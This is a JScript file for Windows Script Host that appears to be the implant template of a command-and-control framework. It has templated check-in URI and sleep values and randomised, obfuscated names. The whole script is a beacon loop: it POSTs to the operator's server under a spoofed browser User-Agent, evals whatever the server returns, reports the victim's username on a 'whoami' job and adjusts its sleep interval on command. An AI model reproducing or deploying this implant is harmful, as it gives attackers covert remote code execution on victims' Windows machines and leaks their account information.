var NVBpaEsftE = 0;
var wscriptshell = new ActiveXObject("WScript.Shell");
var response = '[["{{ check_in_job_id }}"]]';
var sleep = {{ sleep }};

function eCAOpXulfR(data){
  try {
    var CAOrmAizys = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
    CAOrmAizys.Open('Post', '{{ check_in_uri }}');
    CAOrmAizys.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
    CAOrmAizys.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
    CAOrmAizys.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    CAOrmAizys.Send(data);
    CAOrmAizys.WaitForResponse();
    return CAOrmAizys;
  } catch (e) {
    NVBpaEsftE = NVBpaEsftE + 1;
    if(NVBpaEsftE > 50){
      WScript.Quit(1);
    }
  }
}


while (true) {
  try {
      eval("jobs=" + eCAOpXulfR(response).responseText + ";");
      response = '[["{{ check_in_job_id }}"]';
      for (var key in jobs) {
          if ('sleep' === jobs[key][0]) {
              sleep = jobs[key][1]
              response = response + ',["' + key + '","Sleep change to ' +  sleep + ' milliseconds."]';
          }
          if ('whoami' === jobs[key][0]) {
              username = wscriptshell.ExpandEnvironmentStrings("%USERNAME%");
              response = response + ',["' + key + '","' +  username + '"]';
          }

      }
  } catch (e) {
      response = '[["{{ check_in_job_id }}"]]';
  }
  response = response + ']';
  WScript.Sleep(sleep);
}